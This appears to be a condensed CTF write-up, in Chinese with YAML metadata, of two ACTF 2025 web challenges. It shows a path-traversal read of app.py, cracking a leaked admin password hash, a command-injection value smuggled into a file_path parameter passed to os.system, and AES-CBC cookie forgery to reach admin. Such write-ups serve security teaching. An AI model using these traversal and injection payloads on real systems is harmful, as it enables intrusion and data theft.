---
title: ACTF 2025 writeup by Mini-Venom
contest: ACTF
year: 2025
difficulty: medium
vuln_type: web_unknown
tags: [Flask任意文件读, 命令注入, os.system, sha256已知哈希爆破, backdoor密码, AES-CBC cookie伪造, 用户登录绕过, not so web 1, pad-oracle, AES-CBC用户态]
attack_chain:
  - ACTF upload: upload?file_path=../../../../app/app.py 任意文件读源码
  - 源码中 admin 密码 hash=32783cef... 是 backdoor (sha256)
  - admin 走 os.system(f'base64 {file_path} > /tmp/...') 命令注入
  - file_path=; ls / > /tmp/aaa # 列根目录得 Fl4g_is_H3r3
  - file_path=../../../../Fl4g_is_H3r3 读 flag
  - not so web 1: AES-CBC cookie 加密 (iv + padded)，validate_cookie 检查 json.loads 成功
  - 自定义 APPUser dataclass, 管理员 password_raw 在 ADMIN_PASSWORD
  - 加密逻辑 generate_cookie 走 AES-CBC，iv 随机，pad PKCS7
key_payload: 'admin 密码 sha256=backdoor / os.system 命令注入 / file_path=; cmd > /tmp / AES-CBC(iv, KEY) cookie 伪造'
one_liner: ACTF 2025 — upload 任意文件读 + admin backdoor 密码爆破 + os.system 命令注入 + not so web 1 AES-CBC cookie 用户态加密。
lesson: Flask app.py 任意文件读 + sha256 哈希爆破 = admin 入口;os.system 拼接 file_path 是经典命令注入;自定义 AES-CBC cookie 加密可用密钥重放+iv 控制伪造。
quality: medium
---

# ACTF 2025 writeup by Mini-Venom

## 速读
ChaMd5 Mini-Venom 团队 — 2 道 Web。

## Web: ACTF upload
- 任意文件读：`/upload?file_path=../../../../app/app.py` 拿源码
- admin 密码 sha256 hash: `32783cef30bc23d9549623aa48aa8556346d78bd3ca604f277d63d6e573e8ce0`
- 爆破得 `backdoor`
- admin 走 `os.system(f'base64 {file_path} > /tmp/{file_path}.b64')` 注入
- `file_path=; ls / > /tmp/aaa #` 列根目录
- 找到 `Fl4g_is_H3r3`
- `file_path=../../../../Fl4g_is_H3r3` 读 flag

## Web: not so web 1
- AES-CBC(iv + padded) cookie 加密
- validate_cookie 只检查 `json.loads(decrypted)` 不抛异常
- `parse_cookie` 返回 `(True, name)`
- 可构造 `{"name":"admin"}` 密文伪造 admin
